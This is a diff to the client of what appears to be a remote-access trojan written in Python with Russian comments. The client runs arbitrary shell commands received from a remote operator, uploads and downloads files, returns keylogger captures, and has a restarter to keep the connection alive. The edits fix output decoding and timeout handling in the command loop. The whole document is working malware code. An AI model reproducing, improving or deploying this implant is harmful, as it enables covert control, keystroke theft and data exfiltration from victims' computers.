@@ -92,7 +92,16 @@ class Client:
     # Запускает любую конанду в консоле
     def runCommand(self, command):
         """запускает команду в консоле"""
-        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+        stdout = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+        # proc = subprocess.Popen('cmd.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
+        print(command)
+        # stdout, stderr = proc.communicate(command.encode())
+        try:
+            stdout = stdout.decode('utf-8')
+        except Exception:
+            stdout = str(stdout)
+        print(stdout)
+        return stdout
 
     # Reading files with base 64 encryption for non UTF-8 compatability
     def readFile(self, path):
@@ -142,8 +151,9 @@ class Client:
                         case "cd":
                             if len(command) > 1:
                                 os.chdir(command[1])
-                            convCommand = self.arrayToString(command)
-                            command_response = self.runCommand(convCommand).decode()
+                            # convCommand = self.arrayToString(command)
+                            convCommand = " ".join(command)
+                            command_response = self.runCommand(convCommand)
                         case "upload":
                             command_response = self.writeFile(command[1], command[2])
                         case "download":
@@ -176,8 +186,9 @@ class Client:
                         case "keylogger":
                             command_response = self.keylogger.get_keylogs()
                         case _:
-                            convCommand = self.arrayToString(command)
-                            command_response = command_response = self.runCommand(convCommand).decode()
+                            # convCommand = self.arrayToString(command)
+                            convCommand = " ".join(command)
+                            command_response = command_response = self.runCommand(convCommand)
                 # Whole error handling, bad practice but required to keep connection
                 except Exception as e:
                     command_response = (f"Ошибка выполнения команды: {e}")
@@ -185,6 +196,7 @@ class Client:
                 complited = True
             if not complited:
                 self.send_json("выполнение не уложилось в заданный срок")
+                complited = True
 
 
 def restarter(client: Client):
